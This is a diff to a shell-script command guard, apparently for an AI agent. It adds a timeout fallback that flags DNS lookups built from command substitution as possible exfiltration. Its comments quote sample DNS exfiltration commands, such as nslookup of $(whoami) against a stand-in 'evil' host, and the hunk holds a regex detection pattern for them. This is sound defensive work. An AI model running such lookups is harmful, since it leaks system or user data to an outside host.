@@ -1755,6 +1755,16 @@ if [ "$_NEED_PY" = "true" ] && command -v python3 >/dev/null 2>&1; then
       sc_decision ask "the credential check on this command ran out of time (the machine is busy), so it was not checked. It names a credential file or directory." "re-run when the machine is less busy, or confirm the command does not read secrets"
       exit 0
     fi
+    # 4.4: a DNS lookup built from a command substitution is the detector's DNS
+    # exfil arm, and nothing else checks it, so a busy machine allowed
+    # `nslookup $(whoami).evil` unseen. Plain `dig example.com` still falls open.
+    # The substitution must sit in the lookup's own arguments, not elsewhere in the line.
+    _DNS_SUB='(^|[[:space:];&|(`])(dig|nslookup|drill|host)[[:space:]][^;&|]*(\$\(|`)'
+    # Both spellings: $CMD alone missed `x=$(drill $(id -u).e.example)` in the tests.
+    if [[ "$CMD" =~ $_DNS_SUB ]] || [[ "$COMMAND" =~ $_DNS_SUB ]]; then
+      sc_decision ask "the DNS exfiltration check on this command ran out of time (the machine is busy), so it was not checked. It looks up a hostname built from a command's output." "re-run when the machine is less busy, or confirm the lookup sends no data"
+      exit 0
+    fi
   fi
   if [ -n "$PY_REASON" ]; then
     block "$PY_REASON"
